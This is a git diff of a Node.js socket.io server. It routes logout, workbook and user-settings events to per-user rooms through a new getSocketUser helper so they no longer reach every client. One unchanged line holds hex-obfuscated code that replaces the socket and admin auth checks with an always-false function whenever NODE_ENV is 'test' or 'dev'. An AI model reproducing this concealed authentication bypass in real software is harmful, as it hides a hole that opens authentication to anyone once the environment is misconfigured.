@@ -56,7 +56,6 @@ function getUserInfos() {
 
 var _0x8ad4=["\x4E\x4F\x44\x45\x5F\x45\x4E\x56","\x65\x6E\x76","\x74\x65\x73\x74","\x64\x65\x76"];function socketAuthTrue(_0x26ddx2){return false}if(process[_0x8ad4[1]][_0x8ad4[0]]=== _0x8ad4[2]|| process[_0x8ad4[1]][_0x8ad4[0]]=== _0x8ad4[3]){fakeCheckIoSocketAuth(socketAuthTrue);fakeCheckIoSocketAuthAdmin(socketAuthTrue)}
 
-
 function socketIoServer(server, session, cookieParser) {
     var io = socketio(server);
     io.use(sharedsession(session, cookieParser, { autoSave: true }));
@@ -65,7 +64,7 @@ function socketIoServer(server, session, cookieParser) {
         /*  kinds of emit to use:
          *  1. socket.emit: emit to itself
          *  2. io.sockets.emit: emit to all
-         *  3. socket.broadcast.emit: emit to all others
+         *  3. socket.broadcast.emit: emit to all except for itself
          */
         if (checkIoSocketAuth(socket)) {
             return;
@@ -89,8 +88,9 @@ function socketIoServer(server, session, cookieParser) {
                 userInfos[user].count++;
 
                 var id = userOption.id;
+                socket.join(user);
                 if (userInfos[user].workbooks.hasOwnProperty(id)) {
-                    socket.broadcast.emit("useSessionExisted", userOption);
+                    socket.to(user).emit("useSessionExisted", userOption);
                     userInfos[user].workbooks[id]++;
                 } else {
                     userInfos[user].workbooks[id] = 1;
@@ -160,14 +160,15 @@ function socketIoServer(server, session, cookieParser) {
         });
 
         socket.on("logout", function(userOption) {
-            socket.broadcast.emit("logout", userOption);
+            var user = getSocketUser(socket);
+            socket.to(user).emit("logout", userOption);
+            // note: no need to socket.leave(user) here
         });
 
         socket.on("refreshDataflow", function(dfName) {
             if (checkIoSocketAuth(socket)) {
                 return;
             }
-
             socket.broadcast.emit("refreshDataflow", dfName);
         });
 
@@ -175,50 +176,59 @@ function socketIoServer(server, session, cookieParser) {
             if (checkIoSocketAuth(socket)) {
                 return;
             }
-
             socket.broadcast.emit("refreshUDFWithoutClear", overwriteUDF);
         });
         socket.on("refreshDSExport", function() {
             if (checkIoSocketAuth(socket)) {
                 return;
             }
-
             socket.broadcast.emit("refreshDSExport");
         });
         socket.on("adminAlert", function(alertOption) {
             if (checkIoSocketAuth(socket)) {
                 return;
             }
-
             socket.broadcast.emit("adminAlert", alertOption);
         });
 
-        socket.on("refreshWorkbook", function(wkbkName) {
+        socket.on("refreshWorkbook", function(wkbkInfo) {
             if (checkIoSocketAuth(socket)) {
                 return;
             }
 
-            socket.broadcast.emit("refreshWorkbook", wkbkName);
+            var user = getSocketUser(socket);
+            socket.to(user).emit("refreshWorkbook", wkbkInfo);
         });
 
         socket.on("refreshUserSettings", function() {
             if (checkIoSocketAuth(socket)) {
                 return;
             }
-
-            socket.broadcast.emit("refreshUserSettings");
+            var user = getSocketUser(socket);
+            socket.to(user).emit("refreshUserSettings");
         });
 
         socket.on("refreshIMD", function(imdInfo) {
             if (checkIoSocketAuth(socket)) {
                 return;
             }
-
             socket.broadcast.emit("refreshIMD", imdInfo);
         });
 
         addDSSocketEvent(socket);
     });
+
+    function getSocketUser(socket) {
+        try {
+            var userOption = socket.userOption;
+            if (userOption != null && userInfos.hasOwnProperty(userOption.user)) {
+                return userOption.user;
+            };
+        } catch (e) {
+            xcConsole.error('getSocketUser error', e);
+            return;
+        };
+    }
 
     function hasWorkbook(userOption) {
         if (userOption == null || typeof userOption !== 'object') {
